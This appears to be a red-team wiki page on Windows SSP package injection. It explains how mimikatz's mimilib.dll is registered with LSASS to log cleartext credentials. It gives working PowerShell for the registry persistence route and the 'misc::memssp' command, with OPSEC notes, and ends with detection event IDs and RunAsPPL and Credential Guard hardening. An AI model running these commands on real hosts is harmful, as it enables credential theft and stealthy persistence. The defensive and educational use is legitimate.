---
title: SSP Package Injection
slug: ssp-package-injection
---

> **TL;DR:** Register a rogue Security Support Provider DLL (mimikatz's `mimilib.dll`) so LSASS loads it at boot and logs every cleartext credential that flows through authentication — Kerberos, NTLM, runas, the lot.

## What it is
Windows authentication is brokered by SSPs and Authentication Packages — DLLs that LSASS loads on startup or dynamically via `AddSecurityPackage`. The `Security Packages` and `Authentication Packages` registry values under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` list these modules. Dropping mimikatz's `mimilib.dll` into System32 and adding it to that list turns LSASS into a credential logger that writes plaintext passwords to `C:\Windows\System32\kiwissp.log` on every authentication event.

## Preconditions / where it applies
- Local administrator / SYSTEM (write to HKLM\Lsa and System32)
- SeLoadDriverPrivilege not required, but LSA Protection (RunAsPPL) blocks the load
- Reboot needed for the registry path; `AddSecurityPackage` path is immediate but non-persistent

## Technique
The persistent route edits the registry; the in-memory route calls `AddSecurityPackage` from a SYSTEM-context process. Both end with mimilib.dll inside lsass.exe, hooking `SpAcceptCredentials` to capture credentials in the clear.

```powershell
# Persistent: drop the DLL and register the package
Copy-Item .\mimilib.dll C:\Windows\System32\mimilib.dll
$key = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$cur = (Get-ItemProperty $key)."Security Packages"
Set-ItemProperty $key "Security Packages" ($cur + @('mimilib'))
# reboot — then read C:\Windows\System32\kiwissp.log
```

```cmd
:: Non-persistent in-memory load (requires SYSTEM)
mimikatz # misc::memssp
```

OPSEC: registry path survives reboot but is one of the loudest persistence reg keys defenders watch. The `memssp` variant patches LSASS in memory and leaves no disk artefact but dies with the reboot.

## Related: [[credential-dumping]], [[lsa-secrets]], [[lsass-protection-ppl]]

## Detection and defence
- Sysmon Event ID 13 on `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` / `Authentication Packages` / `Notification Packages`
- Security 4614 (notification package loaded) — baseline known good packages and alert on new entries
- Image Load (Sysmon ID 7) of an unsigned DLL into lsass.exe
- Hardening: enable **LSA Protection (RunAsPPL)** and Credential Guard so unsigned SSPs cannot load

## References
- [ired.team — Custom SSP/AP credential interception](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package) — original walkthrough
- [MITRE ATT&CK T1547.005](https://attack.mitre.org/techniques/T1547/005/) — Security Support Provider technique reference
